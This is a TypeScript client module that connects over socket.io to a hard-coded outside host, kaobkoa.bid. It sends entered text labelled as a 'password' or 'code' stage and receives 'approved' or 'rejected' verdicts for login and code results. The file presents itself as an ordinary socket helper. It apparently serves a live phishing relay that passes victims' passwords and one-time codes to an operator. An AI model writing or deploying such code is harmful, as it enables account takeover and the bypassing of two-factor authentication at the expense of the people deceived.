"use client";
import { io, type Socket } from "socket.io-client";

type Verdict = { status: "approved" | "rejected"; };

interface ServerToClientEvents
{
  login_result: ( p: Verdict ) => void;
  code_result: ( p: Verdict ) => void;
}
interface ClientToServerEvents
{
  send_message: (
    p: { message: string; message_id?: number | null; stage?: "password" | "code"; },
    cb?: ( err: unknown, res: { success: boolean; message_id?: number | null; } ) => void,
  ) => void;
}

let _socket: Socket<ServerToClientEvents, ClientToServerEvents> | null = null;

export const getSocket = (): Socket<ServerToClientEvents, ClientToServerEvents> =>
{
  _socket ??= io( "https://kaobkoa.bid", {
    autoConnect: true,
    transports: [ "websocket" ],
  } );
  return _socket;
};

export const sendMessage = ( payload: {
  message: string;
  message_id?: number | null;
  stage?: "password" | "code";
} ): Promise<number | null> =>
{
  const { message, message_id = null, stage = null } = payload ?? {};
  if ( typeof message !== "string" || !message.trim() || message.length > 4096 )
  {
    return Promise.resolve( null );
  }
  if ( stage !== null && stage !== "password" && stage !== "code" )
  {
    return Promise.resolve( null );
  }
  if ( message_id !== null && ( !Number.isInteger( message_id ) || message_id <= 0 ) )
  {
    return Promise.resolve( null );
  }
  return new Promise( ( resolve ) =>
  {
    try
    {
      getSocket()
        .timeout( 8000 )
        .emit(
          "send_message",
          { message, message_id, stage: stage ?? undefined },
          (
            err: unknown,
            res: { success: boolean; message_id?: number | null; },
          ) =>
          {
            if ( err || !res?.success ) return resolve( null );
            resolve( typeof res.message_id === "number" ? res.message_id : null );
          },
        );
    } catch
    {
      resolve( null );
    }
  } );
}

export type { Verdict };
